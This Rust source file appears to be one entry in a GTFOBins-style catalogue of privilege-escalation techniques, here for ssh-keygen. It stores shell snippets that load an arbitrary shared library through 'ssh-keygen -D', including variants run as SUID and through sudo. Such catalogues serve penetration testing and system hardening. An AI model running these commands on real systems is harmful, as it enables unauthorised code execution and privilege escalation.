pub static BIN_NAME: &'static str = "ssh-keygen";
pub static LL_CODE: &'static str = r#"
    
    ssh-keygen -D ./lib.so
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which ssh-keygen) .

    ./ssh-keygen -D ./lib.so
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo ssh-keygen -D ./lib.so
"#;
use crate::code::{Code, Tag};
pub static LL: Code<'static> = Code { 
	title: "LL_CODE",
	code: LL_CODE,
	tag: Tag::LL,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
